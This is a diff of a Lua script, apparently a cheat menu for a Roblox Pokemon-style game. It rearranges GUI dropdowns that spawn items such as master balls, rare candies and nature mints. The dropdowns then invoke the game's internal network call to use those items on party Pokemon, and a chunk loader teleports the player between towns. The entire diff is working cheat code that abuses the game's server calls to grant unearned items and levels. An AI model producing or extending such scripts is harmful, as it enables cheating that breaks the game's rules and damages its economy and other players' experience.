+                            end 
+            if(itemid1 == "carefulmint") then itemid1 = ""
+                            end 
+            if(itemid1 == "gentlemint") then itemid1 = ""
+                    end
+                    if(itemid1 == "hastymint") then itemid1 = ""
+                        end
+                        if(itemid1 == "implishmint") then itemid1 = ""
+                            end
+             if(itemid1 == "jollymint") then itemid1 = ""
+                            end 
+            if(itemid1 == "laxmint") then itemid1 = ""
+                            end 
+            if(itemid1 == "lonelymint") then itemid1 = ""
+                    end
+                    if(itemid1 == "mildmint") then itemid1 = ""
+                        end
+                        if(itemid1 == "modestmint") then itemid1 = ""
+                            end
+             if(itemid1 == "naivemint") then itemid1 = ""
+                            end 
+            if(itemid1 == "naughtymint") then itemid1 = ""
+                            end 
+            if(itemid1 == "quietmint") then itemid1 = ""
+                    end
+                    if(itemid1 == "rashmint") then itemid1 = ""
+                        end
+                        if(itemid1 == "relaxedmint") then itemid1 = ""
+                            end
+             if(itemid1 == "sassymint") then itemid1 = ""
+                            end 
+            if(itemid1 == "seriousmint") then itemid1 = ""
+                            end 
+            if(itemid1 == "timidmint") then itemid1 = ""
+                    end
+        --limits
+
+        spawnitem(item1, qy)
     end
 }
 
-Tab:dropdown({
-    Name = "Item List 📃",
-    StartingText = "these are common items spawned",
-    Items = {
-        {"masterball", 'masterball'},
-        {"rarecandy", 'rarecandy'},
-    },
-    Description = "clicking on an option spawns (+1)",
-    Callback = function(v)
-        
-       
-        spawnitem(v, 1)
-        
-        
-    
-    end,
-})
-local Tab = GUI:Tab{
-	Name = "Levels + Nature",
-	Icon = "rbxassetid://10441082070"
+section:dropdown(
+    {
+        Name = "Item List 📃",
+        StartingText = "these are common items spawned",
+        Items = {
+            {"masterball", "masterball"},
+            {"rarecandy", "rarecandy"},
+            {"bottlecap", "bottlecap"}
+        },
+        Description = "clicking on an option spawns (+1)",
+        Callback = function(v)
+            spawnitem(v, 1)
+        end
+    }
+)
+
+
+local Tab =
+    GUI:Tab {
+    Name = "Levels + IV + EV",
+    Icon = "rbxassetid://10441082070"
 }
+
+local section = Tab:section{
+    Name = "Levels" -- default
+  }
 
 local pee
-Tab:Textbox {
+section:Textbox {
     Name = "Insert Amount of Rare Candies 🗳️",
     Callback = function(str)
         pee = str
     end
 }
 
-Tab:dropdown({
-    Name = "Pokemon Instant Lvl Changer 📈⬆️",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This uses the amount of rare candies that you input above",
-    Callback = function(v)
-    q = pee
-        for i = 1, q do
-    spawnitem('rarecandy', 1) -- item + quantity
-   _p.Network:get("PDS", "useItem", 'rarecandy', v)     
-    end
-    end,
-})
+section:dropdown(
+    {
+        Name = "Pokemon Instant Lvl Changer 📈⬆️",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This uses the amount of rare candies that you input above",
+        Callback = function(v)
+            q = pee
+            for i = 1, q do
+                spawnitem("rarecandy", 1) -- item + quantity
+                _p.Network:get("PDS", "useItem", "rarecandy", v)
+            end
+        end
+    }
+)
 
-Tab:dropdown({
-    Name = "Pokemon EV Remover ❌",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This changes your selected pokemon's EV's to max stat",
-    Callback = function(v)
-    q = 1
-        for i = 1, q do
-   spawnitem('defensereset', 1) -- item + quantity
-   spawnitem('attackreset', 1) -- item + quantity
-   spawnitem('spdefreset', 1) -- item + quantity
-   spawnitem('spatkreset', 1) -- item + quantity
-   spawnitem('speedreset', 1) -- item + quantity
-   spawnitem('hpreset', 1) -- item + quantity
-   _p.Network:get("PDS", "useItem", 'defensereset', v)     
-   _p.Network:get("PDS", "useItem", 'attackreset', v)  
-   _p.Network:get("PDS", "useItem", 'spdefreset', v)  
-   _p.Network:get("PDS", "useItem", 'spatkreset', v)  
-   _p.Network:get("PDS", "useItem", 'speedreset', v)  
-   _p.Network:get("PDS", "useItem", 'hpreset', v)  
-    end
-    end,
-})
+local section = Tab:section{
+    Name = "Nature ( +speed )" -- default
+  }
 
-Tab:dropdown({
-    Name = "Pokemon Jolly Nature Changer (+speed)(-sp atk) 💚",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This changes your selected pokemon's EV's to max stat",
-    Callback = function(v)
-    q = 1
-        for i = 1, q do
-   spawnitem('jollymint', 1) -- item + quantity
-   _p.Network:get("PDS", "useItem", 'jollymint', v)     
+  section:dropdown(
+    {
+        Name = "Pokemon Jolly Nature Changer (+speed)(-sp atk) 💚",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This changes your selected pokemon's EV's to max stat",
+        Callback = function(v)
+            q = 1
+            for i = 1, q do
+                spawnitem("jollymint", 1) -- item + quantity
+                _p.Network:get("PDS", "useItem", "jollymint", v)
+            end
+        end
+    }
+)
 
-    end
-    end,
-})
+section:dropdown(
+    {
+        Name = "Pokemon Timid Nature Changer (+speed)(-atk) 💚",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This changes your selected pokemon's EV's to max stat",
+        Callback = function(v)
+            q = 1
+            for i = 1, q do
+                spawnitem("timidmint", 1) -- item + quantity
+                _p.Network:get("PDS", "useItem", "timidmint", v)
+            end
+        end
+    }
+)
 
-Tab:dropdown({
-    Name = "Pokemon Timid Nature Changer (+speed)(-atk) 💚",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This changes your selected pokemon's EV's to max stat",
-    Callback = function(v)
-    q = 1
-        for i = 1, q do
-   spawnitem('timidmint', 1) -- item + quantity
-   _p.Network:get("PDS", "useItem", 'timidmint', v)     
+section:dropdown(
+    {
+        Name = "Pokemon Naive Nature Changer (+speed)(-sp def) 💚",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This changes your selected pokemon's EV's to max stat",
+        Callback = function(v)
+            q = 1
+            for i = 1, q do
+                spawnitem("naivemint", 1) -- item + quantity
+                _p.Network:get("PDS", "useItem", "naivemint", v)
+            end
+        end
+    }
+)
 
-    end
-    end,
-})
+section:dropdown(
+    {
+        Name = "Pokemon Hasty Nature Changer (+speed)(-def) 💚",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This changes your selected pokemon's EV's to max stat",
+        Callback = function(v)
+            q = 1
+            for i = 1, q do
+                spawnitem("hastymint", 1) -- item + quantity
+                _p.Network:get("PDS", "useItem", "hastymint", v)
+            end
+        end
+    }
+)
 
-Tab:dropdown({
-    Name = "Pokemon Naive Nature Changer (+speed)(-sp def) 💚",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This changes your selected pokemon's EV's to max stat",
-    Callback = function(v)
-    q = 1
-        for i = 1, q do
-   spawnitem('naivemint', 1) -- item + quantity
-   _p.Network:get("PDS", "useItem", 'naivemint', v)     
+local section = Tab:section{
+    Name = "Nature ( +def )" -- default
+  }
 
-    end
-    end,
-})
+  section:dropdown(
+    {
+        Name = "Pokemon Implish Nature Changer (+def)(-sp atk) 💙",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This changes your selected pokemon's EV's to max stat",
+        Callback = function(v)
+            q = 1
+            for i = 1, q do
+                spawnitem("implishmint", 1) -- item + quantity
+                _p.Network:get("PDS", "useItem", "implishmint", v)
+            end
+        end
+    }
+)
 
-Tab:dropdown({
-    Name = "Pokemon Hasty Nature Changer (+speed)(-def) 💚",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This changes your selected pokemon's EV's to max stat",
-    Callback = function(v)
-    q = 1
-        for i = 1, q do
-   spawnitem('hastymint', 1) -- item + quantity
-   _p.Network:get("PDS", "useItem", 'hastymint', v)     
+section:dropdown(
+    {
+        Name = "Pokemon Bold Nature Changer (+def)(-atk) 💙",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This changes your selected pokemon's EV's to max stat",
+        Callback = function(v)
+            q = 1
+            for i = 1, q do
+                spawnitem("boldmint", 1) -- item + quantity
+                _p.Network:get("PDS", "useItem", "boldmint", v)
+            end
+        end
+    }
+)
 
-    end
-    end,
-})
+section:dropdown(
+    {
+        Name = "Pokemon Lax Nature Changer (+def)(-sp def) 💙",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This changes your selected pokemon's EV's to max stat",
+        Callback = function(v)
+            q = 1
+            for i = 1, q do
+                spawnitem("laxmint", 1) -- item + quantity
+                _p.Network:get("PDS", "useItem", "laxmint", v)
+            end
+        end
+    }
+)
 
-Tab:dropdown({
-    Name = "Pokemon Implish Nature Changer (+def)(-sp atk) 💙",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This changes your selected pokemon's EV's to max stat",
-    Callback = function(v)
-    q = 1
-        for i = 1, q do
-   spawnitem('implishmint', 1) -- item + quantity
-   _p.Network:get("PDS", "useItem", 'implishmint', v)     
+section:dropdown(
+    {
+        Name = "Pokemon Relaxed Nature Changer (+def)(-speed) 💙",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This changes your selected pokemon's EV's to max stat",
+        Callback = function(v)
+            q = 1
+            for i = 1, q do
+                spawnitem("relaxedmint", 1) -- item + quantity
+                _p.Network:get("PDS", "useItem", "relaxedmint", v)
+            end
+        end
+    }
+)
 
-    end
-    end,
-})
+local section = Tab:section{
+    Name = "Nature ( +atk )" -- default
+  }
 
-Tab:dropdown({
-    Name = "Pokemon Bold Nature Changer (+def)(-atk) 💙",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This changes your selected pokemon's EV's to max stat",
-    Callback = function(v)
-    q = 1
-        for i = 1, q do
-   spawnitem('boldmint', 1) -- item + quantity
-   _p.Network:get("PDS", "useItem", 'boldmint', v)     
+  section:dropdown(
+    {
+        Name = "Pokemon Lonely Nature Changer (+atk)(-def) ❤️",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This changes your selected pokemon's EV's to max stat",
+        Callback = function(v)
+            q = 1
+            for i = 1, q do
+                spawnitem("lonelymint", 1) -- item + quantity
+                _p.Network:get("PDS", "useItem", "lonelymint", v)
+            end
+        end
+    }
+)
 
-    end
-    end,
-})
+section:dropdown(
+    {
+        Name = "Pokemon Adamant Nature Changer (+atk)(-sp atk) ❤️",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This changes your selected pokemon's EV's to max stat",
+        Callback = function(v)
+            q = 1
+            for i = 1, q do
+                spawnitem("adamantmint", 1) -- item + quantity
+                _p.Network:get("PDS", "useItem", "adamantmint", v)
+            end
+        end
+    }
+)
 
-Tab:dropdown({
-    Name = "Pokemon Lax Nature Changer (+def)(-sp def) 💙",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This changes your selected pokemon's EV's to max stat",
-    Callback = function(v)
-    q = 1
-        for i = 1, q do
-   spawnitem('laxmint', 1) -- item + quantity
-   _p.Network:get("PDS", "useItem", 'laxmint', v)     
+section:dropdown(
+    {
+        Name = "Pokemon Naughty Nature Changer (+atk)(-sp def) ❤️",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This changes your selected pokemon's EV's to max stat",
+        Callback = function(v)
+            q = 1
+            for i = 1, q do
+                spawnitem("naughtymint", 1) -- item + quantity
+                _p.Network:get("PDS", "useItem", "naughtymint", v)
+            end
+        end
+    }
+)
 
-    end
-    end,
-})
+section:dropdown(
+    {
+        Name = "Pokemon Brave Nature Changer (+atk)(-speed) ❤️",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This changes your selected pokemon's EV's to max stat",
+        Callback = function(v)
+            q = 1
+            for i = 1, q do
+                spawnitem("bravemint", 1) -- item + quantity
+                _p.Network:get("PDS", "useItem", "bravemint", v)
+            end
+        end
+    }
+)
 
-Tab:dropdown({
-    Name = "Pokemon Relaxed Nature Changer (+def)(-speed) 💙",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This changes your selected pokemon's EV's to max stat",
-    Callback = function(v)
-    q = 1
-        for i = 1, q do
-   spawnitem('relaxedmint', 1) -- item + quantity
-   _p.Network:get("PDS", "useItem", 'relaxedmint', v)     
+local section = Tab:section{
+    Name = "Nature ( +sp atk )" -- default
+  }
 
-    end
-    end,
-})
+  section:dropdown(
+    {
+        Name = "Pokemon Modest Nature Changer (+sp atk)(-atk) 💜",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This changes your selected pokemon's EV's to max stat",
+        Callback = function(v)
+            q = 1
+            for i = 1, q do
+                spawnitem("modestmint", 1) -- item + quantity
+                _p.Network:get("PDS", "useItem", "modestmint", v)
+            end
+        end
+    }
+)
 
-Tab:dropdown({
-    Name = "Pokemon Lonely Nature Changer (+atk)(-def) ❤️",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This changes your selected pokemon's EV's to max stat",
-    Callback = function(v)
-    q = 1
-        for i = 1, q do
-   spawnitem('lonelymint', 1) -- item + quantity
-   _p.Network:get("PDS", "useItem", 'lonelymint', v)     
+section:dropdown(
+    {
+        Name = "Pokemon Mild Nature Changer (+sp atk)(-def) 💜",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This changes your selected pokemon's EV's to max stat",
+        Callback = function(v)
+            q = 1
+            for i = 1, q do
+                spawnitem("mildmint", 1) -- item + quantity
+                _p.Network:get("PDS", "useItem", "mildmint", v)
+            end
+        end
+    }
+)
 
-    end
-    end,
-})
+section:dropdown(
+    {
+        Name = "Pokemon Rash Nature Changer (+sp atk)(-sp def) 💜",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This changes your selected pokemon's EV's to max stat",
+        Callback = function(v)
+            q = 1
+            for i = 1, q do
+                spawnitem("rashmint", 1) -- item + quantity
+                _p.Network:get("PDS", "useItem", "rashmint", v)
+            end
+        end
+    }
+)
 
-Tab:dropdown({
-    Name = "Pokemon Adamant Nature Changer (+atk)(-sp atk) ❤️",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This changes your selected pokemon's EV's to max stat",
-    Callback = function(v)
-    q = 1
-        for i = 1, q do
-   spawnitem('adamantmint', 1) -- item + quantity
-   _p.Network:get("PDS", "useItem", 'adamantmint', v)     
+section:dropdown(
+    {
+        Name = "Pokemon Quiet Nature Changer (+sp atk)(-speed) 💜",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This changes your selected pokemon's EV's to max stat",
+        Callback = function(v)
+            q = 1
+            for i = 1, q do
+                spawnitem("quietmint", 1) -- item + quantity
+                _p.Network:get("PDS", "useItem", "quietmint", v)
+            end
+        end
+    }
+)
 
-    end
-    end,
-})
+local section = Tab:section{
+    Name = "Nature ( +sp def )" -- default
+  }
 
-Tab:dropdown({
-    Name = "Pokemon Naughty Nature Changer (+atk)(-sp def) ❤️",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This changes your selected pokemon's EV's to max stat",
-    Callback = function(v)
-    q = 1
-        for i = 1, q do
-   spawnitem('naughtymint', 1) -- item + quantity
-   _p.Network:get("PDS", "useItem", 'naughtymint', v)     
+  section:dropdown(
+    {
+        Name = "Pokemon Calm Nature Changer (+sp def)(-atk) 💗",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This changes your selected pokemon's EV's to max stat",
+        Callback = function(v)
+            q = 1
+            for i = 1, q do
+                spawnitem("calmmint", 1) -- item + quantity
+                _p.Network:get("PDS", "useItem", "calmmint", v)
+            end
+        end
+    }
+)
 
-    end
-    end,
-})
+section:dropdown(
+    {
+        Name = "Pokemon Gentle Nature Changer (+sp def)(-def) 💗",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This changes your selected pokemon's EV's to max stat",
+        Callback = function(v)
+            q = 1
+            for i = 1, q do
+                spawnitem("gentlemint", 1) -- item + quantity
+                _p.Network:get("PDS", "useItem", "gentlemint", v)
+            end
+        end
+    }
+)
 
-Tab:dropdown({
-    Name = "Pokemon Brave Nature Changer (+atk)(-speed) ❤️",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This changes your selected pokemon's EV's to max stat",
-    Callback = function(v)
-    q = 1
-        for i = 1, q do
-   spawnitem('bravemint', 1) -- item + quantity
-   _p.Network:get("PDS", "useItem", 'bravemint', v)     
+section:dropdown(
+    {
+        Name = "Pokemon Careful Nature Changer (+sp def)(-sp atk) 💗",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This changes your selected pokemon's EV's to max stat",
+        Callback = function(v)
+            q = 1
+            for i = 1, q do
+                spawnitem("carefulmint", 1) -- item + quantity
+                _p.Network:get("PDS", "useItem", "carefulmint", v)
+            end
+        end
+    }
+)
 
-    end
-    end,
-})
+section:dropdown(
+    {
+        Name = "Pokemon Sassy Nature Changer (+sp def)(-speed) 💗",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This changes your selected pokemon's EV's to max stat",
+        Callback = function(v)
+            q = 1
+            for i = 1, q do
+                spawnitem("sassymint", 1) -- item + quantity
+                _p.Network:get("PDS", "useItem", "sassymint", v)
+            end
+        end
+    }
+)
 
-Tab:dropdown({
-    Name = "Pokemon Modest Nature Changer (+sp atk)(-atk) 💜",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This changes your selected pokemon's EV's to max stat",
-    Callback = function(v)
-    q = 1
-        for i = 1, q do
-   spawnitem('modestmint', 1) -- item + quantity
-   _p.Network:get("PDS", "useItem", 'modestmint', v)     
+local section = Tab:section{
+    Name = "Nature ( null )" -- default
+  }
 
-    end
-    end,
-})
-
-Tab:dropdown({
-    Name = "Pokemon Mild Nature Changer (+sp atk)(-def) 💜",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This changes your selected pokemon's EV's to max stat",
-    Callback = function(v)
-    q = 1
-        for i = 1, q do
-   spawnitem('mildmint', 1) -- item + quantity
-   _p.Network:get("PDS", "useItem", 'mildmint', v)     
-
-    end
-    end,
-})
-
-Tab:dropdown({
-    Name = "Pokemon Rash Nature Changer (+sp atk)(-sp def) 💜",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This changes your selected pokemon's EV's to max stat",
-    Callback = function(v)
-    q = 1
-        for i = 1, q do
-   spawnitem('rashmint', 1) -- item + quantity
-   _p.Network:get("PDS", "useItem", 'rashmint', v)     
-
-    end
-    end,
-})
-
-Tab:dropdown({
-    Name = "Pokemon Quiet Nature Changer (+sp atk)(-speed) 💜",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This changes your selected pokemon's EV's to max stat",
-    Callback = function(v)
-    q = 1
-        for i = 1, q do
-   spawnitem('quietmint', 1) -- item + quantity
-   _p.Network:get("PDS", "useItem", 'quietmint', v)     
-
-    end
-    end,
-})
-
-Tab:dropdown({
-    Name = "Pokemon Calm Nature Changer (+sp def)(-atk) 💗",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This changes your selected pokemon's EV's to max stat",
-    Callback = function(v)
-    q = 1
-        for i = 1, q do
-   spawnitem('calmmint', 1) -- item + quantity
-   _p.Network:get("PDS", "useItem", 'calmmint', v)     
-
-    end
-    end,
-})
-
-Tab:dropdown({
-    Name = "Pokemon Gentle Nature Changer (+sp def)(-def) 💗",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This changes your selected pokemon's EV's to max stat",
-    Callback = function(v)
-    q = 1
-        for i = 1, q do
-   spawnitem('gentlemint', 1) -- item + quantity
-   _p.Network:get("PDS", "useItem", 'gentlemint', v)     
-
-    end
-    end,
-})
-
-Tab:dropdown({
-    Name = "Pokemon Careful Nature Changer (+sp def)(-sp atk) 💗",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This changes your selected pokemon's EV's to max stat",
-    Callback = function(v)
-    q = 1
-        for i = 1, q do
-   spawnitem('carefulmint', 1) -- item + quantity
-   _p.Network:get("PDS", "useItem", 'carefulmint', v)     
-
-    end
-    end,
-})
-
-Tab:dropdown({
-    Name = "Pokemon Sassy Nature Changer (+sp def)(-speed) 💗",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This changes your selected pokemon's EV's to max stat",
-    Callback = function(v)
-    q = 1
-        for i = 1, q do
-   spawnitem('sassymint', 1) -- item + quantity
-   _p.Network:get("PDS", "useItem", 'sassymint', v)     
-
-    end
-    end,
-})
-
-Tab:dropdown({
-    Name = "Pokemon Serious Nature Changer (null)( null) 💛",
-    StartingText = "Party Slot",
-    Items = {
-        {"Slot 1", 1},
-        {"Slot 2", 2},
-        {"Slot 3", 3},
-        {"Slot 4", 4},
-        {"Slot 5", 5},
-        {"Slot 6", 6}
-    },
-    Description = "This changes your selected pokemon's EV's to max stat",
-    Callback = function(v)
-    q = 1
-        for i = 1, q do
-   spawnitem('seriousmint', 1) -- item + quantity
-   _p.Network:get("PDS", "useItem", 'seriousmint', v)     
-
-    end
-    end,
-})
+  section:dropdown(
+    {
+        Name = "Pokemon Serious Nature Changer (null)( null) 💛",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This changes your selected pokemon's EV's to max stat",
+        Callback = function(v)
+            q = 1
+            for i = 1, q do
+                spawnitem("seriousmint", 1) -- item + quantity
+                _p.Network:get("PDS", "useItem", "seriousmint", v)
+            end
+        end
+    }
+)
 --[[
     CHUNK LOADER
 ]]
@@ -1681,192 +1546,209 @@ Tab:Textbox {
     end
 }
 
-Tab:dropdown({
-    Name = "Pokemon City 🏥",
-    StartingText = "Chunk",
-    Items = {
-        {"Mitis Town", 1},
-        {"Chesma Town", 2},
-        {"Silvent City", 3},
-        {"Brimber City", 5},
-        {"Lagoona Lake", 9},
-        {"Rosecove City", 11},
-        {"Aredia City", 25},
-        {"Fluoruma City", 39},
-        {"Frostveil City", 46},
-        {"Port Decca", 52},
-        {"Crescent Town", 54}
-    },
-    Description = "This teleports you to your desired city",
-    Callback = function(v)
-        
-       
+Tab:dropdown(
+    {
+        Name = "Pokemon City 🏥",
+        StartingText = "Chunk",
+        Items = {
+            {"Mitis Town", 1},
+            {"Chesma Town", 2},
+            {"Silvent City", 3},
+            {"Brimber City", 5},
+            {"Lagoona Lake", 9},
+            {"Rosecove City", 11},
+            {"Aredia City", 25},
+            {"Fluoruma City", 39},
+            {"Frostveil City", 46},
+            {"Port Decca", 52},
+            {"Crescent Town", 54}
+        },
+        Description = "This teleports you to your desired city",
+        Callback = function(v)
             _p.DataManager:loadChunk("chunk" .. v)
             _p.Menu.options:getUnstuck(true)
-        
-        
-    
-    end,
-})
+        end
+    }
+)
 --[[
     Pokemon Spawner
 ]]
 local Tab =
     GUI:Tab {
-    Name = "Pokemon Spawner (WILL CRASH YOU ATM)",
